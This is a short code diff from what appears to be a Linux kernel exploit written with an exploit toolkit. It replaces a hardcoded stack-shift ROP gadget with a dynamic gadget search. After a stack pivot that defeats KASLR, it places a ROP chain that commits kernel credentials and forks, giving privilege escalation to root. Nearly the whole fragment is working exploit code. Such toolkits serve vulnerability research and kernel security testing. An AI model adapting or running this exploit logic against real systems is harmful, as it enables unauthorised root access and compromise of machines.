@@ -92,15 +92,20 @@ int main() {
     stack_pivot->ApplyToPayload(payload, kaslr_base);
     *release_ptr = kaslr_base + stack_pivot->GetGadgetOffset();
 
-    // TODO: PivotFinder should handle this case, stack shift gadget implementation is missing
-    // 0xffffffff81113160: pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret ; (1 found)
-    payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + 0x113160);
+    // Find a shift gadget that shifts stack at least by 0x30
+    auto shift_gadget = pivot_finder.FindShift(0x30, 0x48);
+    if (!shift_gadget.has_value())
+        throw ExpKitError("could not find a shift gadget");
+    // TODO: make interface more similar, e.g. use GetGadgetOffset()
+    payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + shift_gadget->address);
 
     RopChain rop(kaslr_base);
     target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
     target.AddRopAction(rop, RopActionId::TELEFORK, {1000});
 
-    payload.Set(0x38, rop.GetData());
+    // TODO: shifting is weird with this +8 for the current pointer
+    auto rop_idx = stack_pivot->GetDestinationOffset() + 8 + shift_gadget->ret_offset;
+    payload.Set(rop_idx, rop.GetData());
 
     printf("[+] Payload:\n");
     HexDump::Print(payload.GetData());
